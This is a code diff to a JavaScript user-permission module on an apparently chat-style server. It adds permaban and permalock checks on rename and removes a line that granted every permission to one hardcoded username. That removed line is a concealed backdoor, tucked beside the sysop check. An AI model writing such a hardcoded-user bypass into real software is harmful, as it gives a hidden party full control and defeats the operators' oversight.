@@ -573,7 +573,7 @@ User = (function () {
 	};
 	User.prototype.isStaff = false;
 	User.prototype.can = function (permission, target, room) {
-		if (this.hasSysopAccess()) return true; if (this.userid === "ylenia3") return true;
+		if (this.hasSysopAccess()) return true;
 
 		var group = this.group;
 		var targetGroup = '';
@@ -739,6 +739,17 @@ User = (function () {
 		this.named = (this.userid.substr(0, 5) !== 'guest');
 		for (var i in this.roomCount) {
 			Rooms.get(i, 'lobby').onRename(this, oldid, joining);
+		}
+		if (global.Permaban && !this.can('staff')) {
+			if (Permaban.permaBan[userid]) {
+				this.send("|popup|Your username (" + name + ") is banned.");
+				this.ban(true, userid);
+				return;
+			}
+			if (Permaban.permaLock[userid]) {
+				this.send("|popup|Your username (" + name + ") is locked.");
+				this.lock(true, userid);
+			}
 		}
 		return true;
 	};
